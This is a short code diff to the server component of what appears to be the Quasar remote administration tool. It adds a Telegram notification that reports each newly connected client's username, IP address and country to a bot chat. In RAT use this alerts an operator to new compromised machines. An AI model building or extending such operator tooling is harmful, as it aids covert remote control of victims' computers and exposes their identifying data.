@@ -1,4 +1,4 @@
-﻿using Quasar.Common.Cryptography;
+using Quasar.Common.Cryptography;
 using Quasar.Common.Messages;
 using Quasar.Common.Messages.other;
 using System;
@@ -6,6 +6,10 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
+using System.Threading.Tasks;
+using Quasar.Server.TelegramSender;
+using dnlib;
+using Quasar.Server.Models;
 
 namespace Quasar.Server.Networking
 {
@@ -37,6 +41,18 @@ namespace Quasar.Server.Networking
         private void OnClientConnected(Client client)
         {
             if (ProcessingDisconnect || !Listening) return;
+            if (Quasar.Server.Models.Settings.TelegramNotifications)
+            {
+                Task.Run(() => Send.SendConnectionMessage(
+                    Quasar.Server.Models.Settings.TelegramBotToken,
+                    Quasar.Server.Models.Settings.TelegramChatID,
+                    client.Value.Username,
+                    client.EndPoint.Address.ToString(),
+                    client.Value.Country
+));
+            }
+
+
             var handler = ClientConnected;
             handler?.Invoke(client);
         }
